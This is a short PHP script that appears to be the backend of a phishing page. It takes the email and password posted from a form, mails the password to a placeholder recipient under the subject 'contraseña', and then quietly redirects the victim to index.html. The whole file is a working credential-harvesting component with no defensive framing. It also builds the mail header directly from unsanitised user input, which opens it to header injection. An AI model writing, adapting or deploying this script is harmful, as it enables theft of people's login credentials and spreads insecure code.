<?php
$mail = $_POST['email'];
$password = $_POST['password'];

$header = 'From: ' . $mail . " \r\n";
$header .= "X-Mailer: PHP/" . phpversion() . " \r\n";
$header .= "Mime-Version: 1.0 \r\n";
$header .= "Content-Type: text/plain";

$mensaje = "Este mensaje fue enviado por " . $mail . ",\r\n";
$mensaje .= "Su e-mail es: " . $mail . " \r\n";
$mensaje .= "Mensaje: " . $_POST['password'] . " \r\n";
$mensaje .= "Enviado el " . date('d/m/Y', time());

$para = 'correo';
$asunto = 'contraseña';

mail($para, $asunto, utf8_decode($password), $header);

header("Location:index.html");
?>